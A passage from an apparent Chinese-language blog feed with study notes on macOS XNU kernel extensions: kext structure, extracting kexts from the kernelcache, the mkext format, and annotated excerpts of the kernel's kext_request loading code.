<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>如何查看 kext 的输入（日志）？</p>
<p>Todo:</p>
<ol>
<li>git 项目 提取 kext</li>
<li>fuzz osx kernel — kext</li>
</ol>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.tanhao.me/pieces/1515.html/" target="_blank" rel="external">初探Mac OSX内核开发(一)——创建内核扩展</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h3&gt;&lt;p&gt;第一个 OSX 上的 Kernel Extension demo&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="xnu" scheme="http://yoursite.com/tags/xnu/"/>
    
      <category term="kext" scheme="http://yoursite.com/tags/kext/"/>
    
      <category term="c" scheme="http://yoursite.com/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>XNU内核设计--Kext内核扩展</title>
    <link href="http://yoursite.com/2017/03/15/XNU%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1-Kext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95/"/>
    <id>http://yoursite.com/2017/03/15/XNU内核设计-Kext内核扩展/</id>
    <published>2017-03-15T03:52:11.000Z</published>
    <updated>2017-03-21T03:14:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<a id="more"></a>
<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<blockquote>
<p>《深入解析MAC OS X &amp; iOS 操作系统》- 第 十八 章: 内核扩展模块</p>
</blockquote>
<!---more-->
<h3 id="kext-基本信息"><a href="#kext-基本信息" class="headerlink" title="kext 基本信息"></a>kext 基本信息</h3><p>kext 的属性：</p>
<ul>
<li>所有者 uid 必须是 root, gid必须是 wheel</li>
<li>文件权限不得超过 644</li>
<li>目录权限不得超过 755</li>
</ul>
<p>预链接：</p>
<h3 id="特殊的-kext-介绍"><a href="#特殊的-kext-介绍" class="headerlink" title="特殊的 kext 介绍"></a>特殊的 kext 介绍</h3><p>书中介绍了一个 用来解密的二进制文件的 kext - Dont Steal Mac OS X.kext (DSMOS).<br>苹果系统于苹果机器EFI模块之间的通信加解密。<br>iOS上的 IOTextEncryptionFamily 用来代替 DSMOS。</p>
<p>在<a href="http://im7ye.lofter.com/post/2c991a_bc8a9f" target="_blank" rel="external">网上收集</a>到一些特殊的 kext。</p>
<ul>
<li>System.kext  最基础的核心系统驱动,mach核心最先载入的驱动,负责于其他扩展通信,</li>
</ul>
<h3 id="kext-基本结构"><a href="#kext-基本结构" class="headerlink" title="kext 基本结构"></a>kext 基本结构</h3><table>
<thead>
<tr>
<th>文件/目录</th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr>
<td>MacOS</td>
<td>保存二进制文件</td>
</tr>
<tr>
<td>PlugIns</td>
<td>存放相关的 kext</td>
</tr>
<tr>
<td>Info.plist</td>
<td>。。</td>
</tr>
</tbody>
</table>
<p>上面几个文件是 bundle 中必备的，其他还有一些文件。</p>
<h3 id="从kernelcache-提取-kext"><a href="#从kernelcache-提取-kext" class="headerlink" title="从kernelcache 提取 kext"></a>从kernelcache 提取 kext</h3><p>OSX 中 kernelcache提供了完整的内核（包括内核+kext+驱动），预加载必要的驱动，加快启动速度。<br>iOS 中 kernelcache只包含要加载的 kext（不包含内核）。</p>
<p>OSX &amp; iOS kernelcache 实现对比</p>
<table>
<thead>
<tr>
<th>操作系统</th>
<th><code>/System/Library/Caches/*</code></th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr>
<td>OSX</td>
<td>com.apple.kext.caches/Startup</td>
<td>胖二进制格式，offset==384处是 complzss</td>
</tr>
<tr>
<td>iOS</td>
<td>com.apple.kernelcaches/kernelcache</td>
<td><strong>IMG3 加密</strong>的 kernelcache,采用 complzss压缩</td>
</tr>
</tbody>
</table>
<p>OSX kernelcache 动态创建，iOS是固定的并且根据机型 定制。</p>
<blockquote>
<p>6.5.2节 给出了OSX与iOS提取kernelcache 的方法。</p>
</blockquote>
<p>作者提供了一个工具joker<br><code>-dec: Decompress kernelcache to /tmp/kernel (complzss only at this stage) 集合了decache shell 脚本</code> 可以用来查看 iOS中的 kext 列表，前提是要先解压、解密kernelcache。(在10.12 上测试了下，貌似工具有 bug)</p>
<p>胖文件头 签名：0xcafebabe<br>Mach-O签名：0xfeedface(32位)或0xfeedfacf(64位)</p>
<p>从 kernelcache 中提取各个 kext 的步骤：</p>
<ol>
<li>根据偏移找到解压标记位，解压（ios需要解密）</li>
<li>otool提取 __PRELINK_TEXT 段 （此段加载了 所有的内核扩展）<br>上面提取的是 kext bundle 列表， 每个 bundle 是 Mach-o Bundle， 通过签名(0xfeedfacf)识别。</li>
<li>kernelcache 对应的属性列表 plist 包含在 PRELINK_INFO 段中。使用 jtool（segedit）提取。kernelcache的plist是ASCII 格式的文本，其中包含了所有 bundle 的 info.plist。</li>
<li>完成提取</li>
</ol>
<p>插播一句：github上有个项目–machkextdump是dump Kext information 从Macos/iOS系统中,主要是帮助逆向分析用的。</p>
<p>表 18-7  kernelcache plist 文件属性<br><img src="/include/img/bk-xnu/kernelcache-plist.png" alt="kernelcache-plist"></p>
<h4 id="OSX-提取-kernelcache-实验"><a href="#OSX-提取-kernelcache-实验" class="headerlink" title="OSX 提取 kernelcache 实验"></a>OSX 提取 kernelcache 实验</h4><p><img src="/include/img/bk-xnu/original-osx-kernelcache.png" alt="original-osx-kernelcache"></p>
<p><img src="/include/img/bk-xnu/thincache.png" alt="thincache.png"><br>这一步该解压了，但是在10.12 上没有 complzss解压工具（需要自己从源码编译），并且发现压缩签名变成了”complzvn”，需要去查看下10.12 的 xnu 代码。</p>
<p><img src="/include/img/bk-xnu/book-pic.png" alt="first step"><br>从作者的截图中知道，第一步完成以后是一个 Mach-O的可执行文件。</p>
<h3 id="multi-kext"><a href="#multi-kext" class="headerlink" title="multi-kext"></a>multi-kext</h3><p>multi-kext （简称 mkext）是不同于 kernelcache的另一种 预链接形式,mkext不包含内核。</p>
<p>mkext 的签名是”MKXTMOSX”。<br>mkext 头部结构：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">uint32_t</span>      magic;       \  MKXT</div><div class="line"><span class="keyword">uint32_t</span>      signature;   \  MOSX</div><div class="line"><span class="keyword">uint32_t</span>      length;      \  mkext 文件大小</div><div class="line"><span class="keyword">uint32_t</span>      adler32;     \  从 version 到文件尾的校验值</div><div class="line"><span class="keyword">uint32_t</span>      version;     \</div><div class="line"><span class="keyword">uint32_t</span>      numkexts;    \  kext的数量</div><div class="line"><span class="keyword">cpu_type_t</span>    cputype;     \  CPU_TYPE_ANY</div><div class="line"><span class="keyword">cpu_subtype_t</span> cpusubtype;     CPU_SUBTYPE_MULTIPLE</div></pre></td></tr></table></figure></p>
<p>在后文分析kext_request 源代码时，就是针对 mkext 格式分析其 load等具体操作流程。</p>
<h3 id="Kext-开发"><a href="#Kext-开发" class="headerlink" title="Kext 开发"></a>Kext 开发</h3><p>在我的 <a href="https://floatingguy.github.io/2017/03/16/OSX-FirstExtension-%E5%BC%80%E5%8F%91/" target="_blank" rel="external">《OSX FirstExtension 开发》</a>这篇文章中介绍了，如何开发Kext 代码和遇到的问题。</p>
<h3 id="Kext-的内核支持"><a href="#Kext-的内核支持" class="headerlink" title="Kext 的内核支持"></a>Kext 的内核支持</h3><p>kext 是在内核态链接。内核态内存默认是 <strong>联动内存？？</strong>，消耗物理内存。 （不明白 啥叫联动内存）</p>
<p>kext 是 XNU 独立组件，相对 Mach 和 BSD 都是独立的。管理 kext 部分的代码在 XNU 中是采用 C++ 开发，并且 I/O Kit也是基于 kext 构建。</p>
<h4 id="kmod-支持（已废弃）"><a href="#kmod-支持（已废弃）" class="headerlink" title="kmod 支持（已废弃）"></a>kmod 支持（已废弃）</h4><p>我们上面 提到了 Mach 和 Kext 是独立的，这个说法是有点问题。因为 Mach 是 XNU 的核心，kext 只是xnu 的一部分，所以 Mach 必然要将 kext 也加入它的理念中(《XNU内核设计–Mach-IPC原理》文章介绍了 Mach的理念)。</p>
<p>Mach的一般做法就是给 内核组件定义 对象, 然后定义一些管理的API。</p>
<ul>
<li>Mach 给 kext 定义了 <code>kmod_info</code>结构体，在<code>osfmk/kern/kmod.h</code>。</li>
<li>在老版本 XNU 代码中 <code>osfmk/kern/kmod.c</code> 中包含大量 kmod 处理代码，包括 <code>kmod_create、kmod_destroy</code>等。目前在10.12 代码中这些函数包括<code>kmod_get_info()</code>都只返回一个 KERN_NOT_SUPPORTED。</li>
</ul>
<h4 id="libkern-支持-kext"><a href="#libkern-支持-kext" class="headerlink" title="libkern 支持 kext"></a>libkern 支持 kext</h4><p>虽然 kmod 框架已经废弃（文件还在 xnu 中）并且定义的 API 都废弃了。 但是 mach 中定义的 kmod_info_t 结构体还沿用至今。目前XNU 管理 kext的代码已经转移到libkern目录下， 并用 C++ 重写对 kext 的支持,相关代码在<code>libkern/c++/OSKext.cpp 中</code></p>
<p>kmod_info_t 是每一个 kext 在入口点接受的一个参数。创建 kext 时， xcode 会通过 KMOD_EXPLICIT_DECL 宏为这个 kext 初始化一个 kmode_info_t数据，保存在<code>/Xcode/DerivedData/&lt;moduleNmae&gt;_info.c 文件中</code> 然而 并不知道 这个 kmod_info 在新的 libkern框架中有什么用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> kmod_info &#123;</div><div class="line">    <span class="keyword">struct</span> kmod_info  * next;</div><div class="line">    <span class="keyword">int32_t</span>             info_version;           <span class="comment">// version of this structure</span></div><div class="line">    <span class="keyword">uint32_t</span>            id;</div><div class="line">    <span class="keyword">char</span>                name[KMOD_MAX_NAME];</div><div class="line">    <span class="keyword">char</span>                version[KMOD_MAX_NAME];</div><div class="line">    <span class="keyword">int32_t</span>             reference_count;        <span class="comment">// # linkage refs to this</span></div><div class="line">    <span class="keyword">kmod_reference_t</span>  * reference_list;         <span class="comment">// who this refs (links on)</span></div><div class="line">    <span class="keyword">vm_address_t</span>        address;                <span class="comment">// starting address</span></div><div class="line">    <span class="keyword">vm_size_t</span>           size;                   <span class="comment">// total size</span></div><div class="line">    <span class="keyword">vm_size_t</span>           hdr_size;               <span class="comment">// unwired hdr size</span></div><div class="line">    <span class="keyword">kmod_start_func_t</span> * start;      <span class="comment">// kext 入口</span></div><div class="line">    <span class="keyword">kmod_stop_func_t</span>  * stop;       <span class="comment">// kext 出口</span></div><div class="line">&#125; <span class="keyword">kmod_info_t</span>;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> KMOD_DECL(name, version)                                  \</span></div><div class="line">    static kmod_start_func_t name ## _module_start;               \</div><div class="line">    static kmod_stop_func_t  name ## _module_stop;                \</div><div class="line">    kmod_info_t KMOD_INFO_NAME = &#123; 0, KMOD_INFO_VERSION, -1U,      \</div><div class="line">                       &#123; #name &#125;, &#123; version &#125;, -1, 0, 0, 0, 0,    \</div><div class="line">                           name ## _module_start,                 \</div><div class="line">                           name ## _module_stop &#125;;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> KMOD_EXPLICIT_DECL(name, version, start, stop)            \</span></div><div class="line">    kmod_info_t KMOD_INFO_NAME = &#123; 0, KMOD_INFO_VERSION, -1U,      \</div><div class="line">                       &#123; #name &#125;, &#123; version &#125;, -1, 0, 0, 0, 0,    \</div><div class="line">                           start, stop &#125;;</div></pre></td></tr></table></figure>
<p>看下xcode 给 FirstExtension.kext 生成 kmod_info 结构体的代码。<br><code>/Users/xxx/Library/Developer/Xcode/DerivedData/FirstExtension-caeeqdglmmdwxqajtyioipnqbieo/Build/Intermediates/FirstExtension.build/Release/FirstExtension.build/DerivedSources/FirstExtension_info.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/mach_types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">extern</span> <span class="keyword">kern_return_t</span> _start(<span class="keyword">kmod_info_t</span> *ki, <span class="keyword">void</span> *data);</div><div class="line"><span class="keyword">extern</span> <span class="keyword">kern_return_t</span> _stop(<span class="keyword">kmod_info_t</span> *ki, <span class="keyword">void</span> *data);</div><div class="line">__<span class="function">private_extern__ kern_return_t <span class="title">FirstExtension_start</span><span class="params">(<span class="keyword">kmod_info_t</span> *ki, <span class="keyword">void</span> *data)</span></span>;</div><div class="line">__<span class="function">private_extern__ kern_return_t <span class="title">FirstExtension_stop</span><span class="params">(<span class="keyword">kmod_info_t</span> *ki, <span class="keyword">void</span> *data)</span></span>;</div><div class="line"></div><div class="line">__attribute__((visibility(<span class="string">"default"</span>))) KMOD_EXPLICIT_DECL(com.xxx.FirstExtension, <span class="string">"1.0.0d1"</span>, _start, _stop)</div><div class="line">__private_extern__ <span class="keyword">kmod_start_func_t</span> *_realmain = FirstExtension_start;</div><div class="line">__private_extern__ <span class="keyword">kmod_stop_func_t</span> *_antimain = FirstExtension_stop;</div><div class="line">__private_extern__ <span class="keyword">int</span> _kext_apple_cc = __APPLE_CC__ ;</div></pre></td></tr></table></figure>
<p>就是用来注册 kext 的入口函数和出口函数到 kmod_info 结构体中。</p>
<p>kextd 守护进程：该进程是 内核态和用户态的桥梁,辅助完成 kext 的加载和依赖性解析。<br>kexd 被 launchd 加载时注册了 <strong>主机特殊端口</strong>  host port #15(HOST_KEXTD_PORT)。<br>kexd 和用户态进程（客户端）通过 mach 消息通信<a href="https://floatingguy.github.io/2017/02/27/mach-port-names-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/" target="_blank" rel="external">MIG 子系统 70000</a>。<br>iOS 没有 kextd。</p>
<p>IOKit 框架提供了一套 API 封装了和 texd 交互的消息发送和接受。<br>还有一些 API 给 kextd使用，用来和内核直接交互。<br>IOKit 框架API, 表18-8.</p>
<ul>
<li>OSKextLoad</li>
<li>OSKextLoadWithOptions</li>
<li>OSKextUnload</li>
<li>OSKextStart</li>
<li>OSKextStop</li>
<li>OSKextIsStarted</li>
<li>OSKextCopyLoadedKextInfo</li>
</ul>
<p>上述的 API 都是用户态的。</p>
<h4 id="kext-加载的原理"><a href="#kext-加载的原理" class="headerlink" title="kext 加载的原理"></a>kext 加载的原理</h4><p><img src="/include/img/bk-xnu/kext_request.png" alt="OSKext::kext_request"><br>害怕在代码中迷路的同学，先来 看下流程图吧。</p>
<p>上面提到 kext 的加载机制使用了 Mach 消息，所有的 kext 操作都封装为序列化的 XML 格式，并放在 Mach kext_request 消息的 ool_descriptors 数据中。<br>下面分析 内核中kext_request 函数如何处理 kext 加载。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">kern_return_t</span> kext_request(</div><div class="line">    <span class="keyword">host_priv_t</span>                             hostPriv,</div><div class="line">    <span class="comment">/* in only */</span>  <span class="keyword">uint32_t</span>                 clientLogSpec,</div><div class="line">    <span class="comment">/* in only */</span>  <span class="keyword">vm_offset_t</span>              requestIn,</div><div class="line">    <span class="comment">/* in only */</span>  <span class="keyword">mach_msg_type_number_t</span>   requestLengthIn,</div><div class="line">    <span class="comment">/* out only */</span> <span class="keyword">vm_offset_t</span>            * responseOut,</div><div class="line">    <span class="comment">/* out only */</span> <span class="keyword">mach_msg_type_number_t</span> * responseLengthOut,</div><div class="line">    <span class="comment">/* out only */</span> <span class="keyword">vm_offset_t</span>            * logDataOut,</div><div class="line">    <span class="comment">/* out only */</span> <span class="keyword">mach_msg_type_number_t</span> * logDataLengthOut,</div><div class="line">    <span class="comment">/* out only */</span> <span class="keyword">kern_return_t</span>          * op_result)</div><div class="line">&#123;</div><div class="line">    result = vm_map_copyout(kernel_map, &amp;map_addr, (<span class="keyword">vm_map_copy_t</span>)requestIn);</div><div class="line">    ..</div><div class="line">    request = CAST_DOWN(<span class="keyword">char</span> *, map_addr);</div><div class="line"></div><div class="line">   <span class="keyword">if</span> (requestLengthIn &gt; <span class="keyword">sizeof</span>(mkext2_header)) &#123;</div><div class="line">        mkextHeader = (mkext2_header *)request;</div><div class="line">        <span class="keyword">if</span> (MKEXT_GET_MAGIC(mkextHeader) == MKEXT_MAGIC &amp;&amp;</div><div class="line">            MKEXT_GET_SIGNATURE(mkextHeader) == MKEXT_SIGN) &#123;</div><div class="line"></div><div class="line">            isMkext = <span class="literal">true</span>;    <span class="comment">//OK</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// 传递一个 mkext 包。</span></div><div class="line">    <span class="comment">/*</span></div><div class="line">    通过分析handleRequest 流程确定，当传入 Load Predicate 时，一定是 mkext 格式的数据，应为还没有加载只有 mkext 文件可以load</div><div class="line">     */</div><div class="line">    <span class="keyword">if</span> (isMkext) &#123;</div><div class="line">...</div><div class="line">        *op_result = OSKext::loadFromMkext((OSKextLogSpec)clientLogSpec,</div><div class="line">            request, requestLengthIn,</div><div class="line">            &amp;logData, &amp;logDataLength);        <span class="comment">//</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* defined(SECURE_KERNEL) */</span></span></div><div class="line"></div><div class="line">    &#125; <span class="keyword">else</span> <span class="comment">// 或者传递一个  XML 文件 （略）</span></div><div class="line">    &#123;</div><div class="line">      *op_result = OSKext::handleRequest(hostPriv,</div><div class="line">            (OSKextLogSpec)clientLogSpec,</div><div class="line">            request, requestLengthIn,</div><div class="line">            &amp;response, &amp;responseLength,</div><div class="line">            &amp;logData, &amp;logDataLength);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">OSReturn</div><div class="line">OSKext::loadFromMkext((OSKextLogSpec)clientLogSpec,</div><div class="line">            request, requestLengthIn,</div><div class="line">            &amp;logData, &amp;logDataLength) &#123;</div><div class="line"></div><div class="line">  ...</div><div class="line">   mkextData = OSData::withBytesNoCopy(mkextBuffer,</div><div class="line">        mkextBufferLength);</div><div class="line">...</div><div class="line">    result = readMkext2Archive(mkextData, &amp;mkextPlist, <span class="literal">NULL</span>);   <span class="comment">//</span></div><div class="line">...</div><div class="line">    <span class="comment">// 文本字符串</span></div><div class="line">    <span class="comment">// 获取 kext  的操作命令：Load</span></div><div class="line">    predicate = _OSKextGetRequestPredicate(mkextPlist);</div><div class="line"></div><div class="line">    <span class="comment">//检查　predicate是否是　“Load”, 这里 只处理 Load Predicate</span></div><div class="line">     <span class="keyword">if</span> (!predicate || !predicate-&gt;isEqualTo(kKextRequestPredicateLoad)) &#123;</div><div class="line">        OSKextLog(<span class="comment">/* kext */</span> <span class="literal">NULL</span>,</div><div class="line">            kOSKextLogErrorLevel |</div><div class="line">            kOSKextLogLoadFlag,</div><div class="line">            <span class="string">"Received kext load request with no predicate; skipping."</span>);</div><div class="line">        result = kOSKextReturnInvalidArgument;</div><div class="line">        <span class="keyword">goto</span> finish;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">   <span class="comment">// 加载　info.plist　中的参数</span></div><div class="line">    requestArgs = OSDynamicCast(OSDictionary,</div><div class="line">        mkextPlist-&gt;getObject(kKextRequestArgumentsKey));</div><div class="line">...</div><div class="line">    <span class="comment">// 获取当前 kext 的 Bundle id （唯一标识）</span></div><div class="line">    kextIdentifier = OSDynamicCast(OSString,</div><div class="line">        requestArgs-&gt;getObject(kKextRequestArgumentBundleIdentifierKey));</div><div class="line">...</div><div class="line"></div><div class="line"><span class="comment">/* Load the kext, with no deferral, since this is a load from outside</span></div><div class="line">    * the kernel.</div><div class="line">    * xxx - Would like a better way to handle the default values for the</div><div class="line">    * xxx - start/match opt args.</div><div class="line">    */</div><div class="line">    result = OSKext::loadKextWithIdentifier(    <span class="comment">//[通过Identifier来加载 kext ]</span></div><div class="line">        kextIdentifier,</div><div class="line">        <span class="comment">/* allowDefer */</span> <span class="literal">false</span>,     <span class="comment">//不支持 延迟加载</span></div><div class="line">        delayAutounload,</div><div class="line">        startKextExcludeLevel,</div><div class="line">        startMatchingExcludeLevel,</div><div class="line">        personalityNames);</div><div class="line">...</div><div class="line">        <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>下表是kext_request 支持的命令，这些命令保存在<code>Kext Request Predicate</code>键值中。</p>
<p><img src="/include/img/bk-xnu/kext-predicate.png" alt="predicate"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">mkext2_header 成员</div><div class="line">    <span class="keyword">uint32_t</span>      magic;       \</div><div class="line">    <span class="keyword">uint32_t</span>      signature;   \</div><div class="line">    <span class="keyword">uint32_t</span>      length;      \</div><div class="line">    <span class="keyword">uint32_t</span>      adler32;     \</div><div class="line">    <span class="keyword">uint32_t</span>      version;     \</div><div class="line">    <span class="keyword">uint32_t</span>      numkexts;    \</div><div class="line">    <span class="keyword">cpu_type_t</span>    cputype;     \</div><div class="line">    <span class="keyword">cpu_subtype_t</span> cpusubtype;</div><div class="line"></div><div class="line">   <span class="keyword">uint32_t</span> plist_offset;</div><div class="line">    <span class="keyword">uint32_t</span> plist_compressed_size;</div><div class="line">    <span class="keyword">uint32_t</span> plist_full_size;</div></pre></td></tr></table></figure>
<p>从kext　中提取info.plist<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line">OSReturn</div><div class="line">OSKext::readMkext2Archive(</div><div class="line">    OSData        * mkextData,</div><div class="line">    OSDictionary ** mkextPlistOut,</div><div class="line">    <span class="keyword">uint32_t</span>      * checksumPtr)   &#123;</div><div class="line"></div><div class="line">    <span class="comment">// 获取mkext2_header的 plist_offset、plist_compressed_size、plist_full_size字段。</span></div><div class="line">    mkextPlistOffset = MKEXT2_GET_PLIST(mkextHeader);</div><div class="line">    mkextPlistCompressedSize = MKEXT2_GET_PLIST_COMPSIZE(mkextHeader);</div><div class="line">    mkextPlistEnd = (<span class="keyword">char</span> *)mkextHeader + mkextPlistOffset +</div><div class="line">        mkextPlistCompressedSize;</div><div class="line">    ...</div><div class="line"></div><div class="line">    mkextPlistFullSize = MKEXT2_GET_PLIST_FULLSIZE(mkextHeader);</div><div class="line"></div><div class="line">    <span class="comment">// 先不考虑压缩的情况</span></div><div class="line">    <span class="keyword">if</span> (mkextPlistCompressedSize) &#123;</div><div class="line">        ...</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        mkextPlistDataBuffer = (<span class="keyword">const</span> <span class="keyword">char</span> *)mkextHeader + mkextPlistOffset;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    parsedXML = OSUnserializeXML(mkextPlistDataBuffer, &amp;errorString);</div><div class="line">    <span class="keyword">if</span> (parsedXML) &#123;</div><div class="line">        mkextPlist = OSDynamicCast(OSDictionary, parsedXML);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//mkextPlist 是一个字典</span></div><div class="line">    <span class="keyword">if</span> (!mkextPlist) &#123;</div><div class="line">        ...</div><div class="line">        <span class="keyword">goto</span> finish;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">   <span class="comment">// 上层 传入mkextPlistOut</span></div><div class="line">    <span class="keyword">if</span> (mkextPlistOut) &#123;</div><div class="line">        *mkextPlistOut = mkextPlist;</div><div class="line">        (*mkextPlistOut)-&gt;retain();</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//提取 _MKEXTInfoDictionaries key 对应的数据</span></div><div class="line">    mkextInfoDictArray = OSDynamicCast(OSArray,</div><div class="line">        mkextPlist-&gt;getObject(kMKEXTInfoDictionariesKey));</div><div class="line">    ...</div><div class="line">        <span class="keyword">goto</span> finish;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    count = mkextInfoDictArray-&gt;getCount();</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++) &#123;</div><div class="line">        OSDictionary * infoDict;</div><div class="line"></div><div class="line"></div><div class="line">        infoDict = OSDynamicCast(OSDictionary,</div><div class="line">                                 mkextInfoDictArray-&gt;getObject(i));</div><div class="line">         ...</div><div class="line">         <span class="comment">// 这个 创建一个 newKext 对象，然后释放（计数器-1）。但是 系统还保留了 OSKext 在全局对象中</span></div><div class="line">        <span class="keyword">if</span> (infoDict) &#123;</div><div class="line">            OSKext * newKext = OSKext::withMkext2Info(infoDict, mkextData);</div><div class="line">            OSSafeReleaseNULL(newKext);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">   <span class="comment">/* Even if we didn't keep any kexts from the mkext, we may have a load</span></div><div class="line">    * request to process, so we are successful (no errors occurred).</div><div class="line">    * 即使 我们没有 引用任何 kext, 我们还需要给进程发送一请求</div><div class="line">    */</div><div class="line">    result = kOSReturnSuccess;</div><div class="line"></div><div class="line">finish:</div><div class="line"></div><div class="line">    OSSafeReleaseNULL(parsedXML);</div><div class="line">    